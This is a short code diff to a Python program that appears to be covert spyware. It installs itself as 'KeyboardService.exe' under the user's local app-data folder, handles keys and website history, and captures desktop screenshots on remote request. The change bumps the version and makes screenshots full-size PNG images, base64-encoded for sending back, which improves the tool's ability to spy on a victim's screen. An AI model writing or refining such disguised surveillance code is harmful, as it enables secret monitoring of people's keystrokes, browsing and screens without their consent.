@@ -50,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.0.0.0.02"
+APP_VERSION = "1.0.0.0.03"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -610,9 +610,8 @@ def normalize_key(key):
 def capture_desktop_screenshot():
     try:
         image = ImageGrab.grab(all_screens=False)
-        image.thumbnail((1024, 640))
         output = BytesIO()
-        image.convert("RGB").save(output, format="JPEG", quality=70, optimize=True)
+        image.save(output, format="PNG", optimize=True)
         return base64.b64encode(output.getvalue()).decode("ascii")
     except Exception as error:
         report_screenshot_status("Failed", f"Desktop capture error: {type(error).__name__}")
